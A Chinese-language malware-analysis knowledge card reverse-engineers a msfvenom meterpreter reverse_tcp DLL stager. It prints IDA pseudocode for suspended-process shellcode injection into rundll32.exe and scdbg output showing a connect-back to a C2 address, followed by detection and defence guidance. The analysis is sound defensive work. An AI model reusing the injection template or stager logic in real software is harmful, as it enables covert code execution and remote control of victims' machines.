---
id: code-analysis-reverse-windows-msfvenom-reverse-tcp-dll-stager
title: msfvenom reverse_tcp DLL stager 逆向：DllMain 创建 rundll32.exe 挂起进程，写 shellcode 并 SetThreadContext 执行，scdbg 还原 C2
type: scenario
domain: code-analysis
path: code-analysis/reverse/windows
technique: msfvenom-reverse-tcp-dll-stager-analysis
tags:
- windows
- reverse
- dll
- stager
- meterpreter
- msfvenom
- scdbg
- shellcode
- ida
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V654
  verified_at: '2026-11-13T05:27:58+08:00'
  notes: 已对照原文与全部54图核对：CreateProcessA 0x1000044/0x44、VirtualAllocEx(0,0x1000,0x1000,0x40)、WriteProcessMemory(unk_10003000,0x1000)、SetThreadContext/ResumeThread 与IDA伪代码一致；scdbg 1000字节输出 connect 192.168.26.130:88 与截图一致；DLL 9216字节/payload 354字节与msfvenom截图一致；已将sub_100011A0描述修正为原文可见的'返回值作为创建进程前置条件'。未验证点：PoC未本机复跑；msfvenom生成物无受影响版本；frontmatter无sources/source_url。
url: /docs/code-analysis/reverse/windows/code-analysis-reverse-windows-msfvenom-reverse-tcp-dll-stager/
draft: false
kb_aliases:
- msfvenom DLL 分析
- meterpreter stager 逆向
- reverse_tcp DLL 结构
- Rundll32Exe stager
- scdbg WSASocket
- DLL 内嵌 shellcode 定位
---

## 一句话结论

msfvenom `windows/meterpreter/reverse_tcp` 生成的 DLL 是一个 stager：`DllEntryPoint` 调用内部函数先尝试 `CreateProcessA` 拉起宿主进程（失败则回退 `rundll32.exe`），对挂起进程 `VirtualAllocEx` + `WriteProcessMemory` 写入 `unk_10003000` 处的内嵌 shellcode，再改 `Context.Eip`、`SetThreadContext`、`ResumeThread` 执行；把 shellcode 抽出交给 scdbg，可直接看到 `WSASocket` + `connect(LHOST:LPORT)`，从而在不解密、不运行样本的情况下拿到 C2 地址与二阶段加载方式。

## 原理

- **stager DLL 的结构**：样本很小（本例 DLL 共 9216 字节，其中 payload 354 字节），导出/入口是 `DllEntryPoint`，真正的逻辑在内部函数（本例 `sub_10001050`，另有 `sub_10001000` 用于清零/初始化 `STARTUPINFO`、`sub_100011A0` 的返回值作为是否创建进程的前置条件，原文未展开其实现）。
- **进程选择**：伪代码显示先以 `CreateProcessA(0, CommandLine, ..., 0x1000044, ...)` 尝试按内置命令行拉起进程；返回 0 时回退 `CreateProcessA(0, "rundll32.exe", ..., 0x44, ...)`。两种标志都含 `CREATE_SUSPENDED`（0x4），保证目标进程以挂起状态创建，便于随后劫持主线程。
- **注入 shellcode**：对创建出的进程 `VirtualAllocEx(hProcess, 0, 0x1000, 0x1000, 0x40)`（MEM_COMMIT|MEM_RESERVE，PAGE_EXECUTE_READWRITE），`WriteProcessMemory(hProcess, lpBaseAddress, &unk_10003000, 0x1000, 0)` 把 DLL 内嵌的 0x1000 字节 shellcode 写进去；`GetThreadContext` 后把 `Context.Eip` 指向该缓冲区，`SetThreadContext` + `ResumeThread` 让合法宿主进程执行 shellcode。
- **为什么用 rundll32.exe**：rundll32 是微软签名的系统程序，以它为宿主可让网络行为落在“合法进程”名下；DLL 本体不需要完整实现 C2，真正的 meterpreter 由网络下发，落地文件与运行载荷分离。
- **shellcode 行为**：scdbg 模拟（本例 1000 字节）显示 `LoadLibraryA(ws2_32)` → `WSAStartup(190)` → `WSASocket(af=2, tp=1)` → `connect(host=192.168.26.130, port=88)` → `recv`/`closesocket`。对照 MSF stager 源码：先 `recv` 4 字节二阶段长度，`VirtualAlloc(NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE)` 分配 RWX，再循环 `recv` 把二阶段读入缓冲区，最后跳转执行。
- **为什么可复用**：同样的“DLL 入口 → CreateProcess 挂起宿主 → 写 shellcode → SetThreadContext”模板被多种 C2 的 DLL artifact/stager 使用；掌握特征后，看到 DLL 里有 `CreateProcessA`+`VirtualAllocEx`+`SetThreadContext`+内嵌大块可执行字节，即可快速定位 shellcode 与 C2。

## 触发条件

- 拿到可疑 DLL（钓鱼释放、Web 下载、白加黑侧加载），需要判断是否为 Metasploit/同类 stager 并提取 IOC。
- 样本未加壳、未强混淆；有 IDA/Ghidra 与 scdbg（或 speakeasy 等 shellcode 模拟器）。
- 需要在不连真实 C2 的前提下还原网络行为。

## 利用步骤

1. IDA 打开 DLL，查看 `DllEntryPoint` 及导出表；跟进入口调用的内部函数。
2. 定位含 `CreateProcessA/W`、`VirtualAllocEx`、`WriteProcessMemory`、`GetThreadContext`/`SetThreadContext`、`ResumeThread` 的函数（本例 `sub_10001050`）。
3. 记录宿主命令行（`rundll32.exe` 或内置 CommandLine）、创建标志（0x1000044/0x44，均含 CREATE_SUSPENDED）、shellcode 源地址与长度（本例 `unk_10003000`，0x1000）。
4. 在十六进制视图从 shellcode 源地址提取对应字节（本例可见 `FC E8 ...` 开头与 `ws2_32` 字符串），保存为 `code.bin`。
5. `scdbg -f code.bin` 模拟执行，记录 API 序列与 `connect` 的 host/port，即 C2 地址；若 scdbg 步数不够，调大 `-s` 最大步数。
6. 对照 MSF stager 源码确认二阶段逻辑（4 字节长度 → VirtualAlloc RWX → recv 循环 → 跳转），必要时从流量/内存提取二阶段继续分析。
7. 输出 IOC：C2 IP/端口、宿主进程、shellcode 偏移与哈希；与终端/流量日志关联（rundll32 无参数启动、回连高位端口）。

## PoC

```bash
# 1) 提取 shellcode 后模拟执行
scdbg -f code.bin

# 2) 输出示例
LoadLibraryA(ws2_32)
WSAStartup(190)
WSASocket(af=2, tp=1, proto=0, group=0, flags=0)
connect(h=42, host: 192.168.26.130 , port: 88 )
recv(...)
```

IDA 伪代码要点（本例）：

```c
v4 = CreateProcessA(0, CommandLine, 0,0,1, 0x1000044u, 0,0, &StartupInfo, &ProcessInformation);
if (!v4)
    v4 = CreateProcessA(0, "rundll32.exe", 0,0,1, 0x44u, 0,0, &StartupInfo, &ProcessInformation);
lpBaseAddress = VirtualAllocEx(ProcessInformation.hProcess, 0, 0x1000u, 0x1000u, 0x40u);
WriteProcessMemory(ProcessInformation.hProcess, lpBaseAddress, &unk_10003000, 0x1000u, 0);
Context.Eip = (DWORD)lpBaseAddress;
SetThreadContext(ProcessInformation.hThread, &Context);
ResumeThread(ProcessInformation.hThread);
```

## 变体与关联

- **msfvenom 其他格式**：exe/ps1/hta 等 stager 结构类似（小 loader + 网络取二阶段），只是宿主与注入方式不同。
- **其他 C2 的 DLL 加载器**：Cobalt Strike artifact kit、Sliver 等也常用“创建挂起进程 + 写 shellcode + SetThreadContext”模板；识别要点是 CreateProcess 标志与内嵌可执行字节。
- **反射式变体**：不创建新进程，直接在 `DllMain` 中映射 PE，需转向反射加载特征分析。
- 关联卡片：[[pentest-c2-classic-remote-thread-dll-injection]]（远程线程注入 DLL 的经典链）、[[defense-detection-rundll32-injected-dll-sysmon-scriptblock]]（该 stager 的日志检测）、[[code-analysis-reverse-windows-initterm-static-initializer-tcp-shellcode-loader]]（静态初始化中执行 TCP shellcode 的变体）。

## 检测与防御

- **静态**：DLL 同时导入 `CreateProcessA`、`VirtualAllocEx`、`WriteProcessMemory`、`SetThreadContext`、`ResumeThread` 且含大块高熵可执行段，是强特征；YARA 可匹配入口调用模式与 `ws2_32` 相关字符串。
- **动态/终端**：rundll32.exe 无参数启动、父进程异常、`Private: Commit` 且 RWX 的内存、内存中出现 MZ/PE；Sysmon 事件 1/3/8/10 关联。
- **网络**：非浏览器进程（rundll32、regsvr32）外连高位端口或陌生 IP，结合 DNS 与威胁情报。
- **防御**：WDAC/AppLocker 限制 rundll32 的非常规调用；EDR 监控跨进程写内存与远程线程；对下载的 DLL 做签名与静态扫描；生产环境禁用不必要的脚本宿主。
